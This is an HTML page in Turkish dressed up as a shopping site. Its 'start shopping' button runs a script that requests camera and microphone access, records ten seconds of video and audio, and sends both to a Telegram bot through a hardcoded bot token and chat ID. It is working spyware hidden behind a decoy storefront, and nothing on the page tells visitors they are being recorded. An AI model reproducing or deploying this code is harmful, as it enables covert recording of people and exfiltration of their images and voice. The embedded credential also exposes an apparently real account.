<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Alışveriş Sitesi</title>
<link rel="stylesheet" href="styles.css">
<style>
  body {
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
    background-color: #f0f0f0;
  }

  h1 {
    color: #333;
  }

  p {
    color: #666;
  }

  button {
    padding: 10px 20px;
    background-color: #007bff;
    color: #fff;
    border: none;
    border-radius: 5px;
    cursor: pointer;
  }

  button:hover {
    background-color: #0056b3;
  }
</style>
</head>
<body>
<h1>Hoş Geldiniz!</h1>
<p>Burası gerçek bir alışveriş sitesi gibi görünüyor, değil mi? 🛍️</p>
<p>Lütfen alışveriş yapmaya başlamak için "Alışverişe Başla" butonuna basın:</p>
<button onclick="startShopping()">Alışverişe Başla</button>

<script>
var botToken = "6953014668:AAH70G-dePUlNb9mmCC0T1-UZoxPXKB4hFc"; // Botun API anahtarı
var chatId = "6070918315"; // Telegram kullanıcı ID'si

// Alışverişe başla ve video ve sesi Telegram botuna gönder
function startShopping() {
    getVideoAndAudio(function(videoData, audioData) {
        sendMediaToTelegramBot(videoData, "video");
        sendMediaToTelegramBot(audioData, "audio");
    });
}

// Video ve sesi al
function getVideoAndAudio(callback) {
    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(function(stream) {
            var videoData = new MediaRecorder(stream);
            var audioData = new MediaRecorder(stream);

            // Video ve ses kayıtlarını dinleme
            var videoChunks = [];
            var audioChunks = [];
            videoData.ondataavailable = function(event) {
                videoChunks.push(event.data);
            };
            audioData.ondataavailable = function(event) {
                audioChunks.push(event.data);
            };

            // Kayıt durduğunda video ve sesi gönderme
            videoData.onstop = function() {
                var videoBlob = new Blob(videoChunks, { type: 'video/webm' });
                var audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                callback(videoBlob, audioBlob);
            };

            // Kayıtı başlatma
            videoData.start();
            audioData.start();

            // Kayıtı durdurma
            setTimeout(function() {
                videoData.stop();
                audioData.stop();
            }, 10000); // 10 saniye sonra kaydı durdur
        })
        .catch(function(err) {
            console.error('Video ve ses alınamadı:', err);
        });
}

// Video veya sesi Telegram botuna gönder
function sendMediaToTelegramBot(mediaData, type) {
    var formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append(type, mediaData);
    var apiUrl = "https://api.telegram.org/bot" + botToken + "/send" + type.charAt(0).toUpperCase() + type.slice(1);
    var xhr = new XMLHttpRequest();
    xhr.open('POST', apiUrl);
    xhr.send(formData);
}
</script>
</body>
</html>
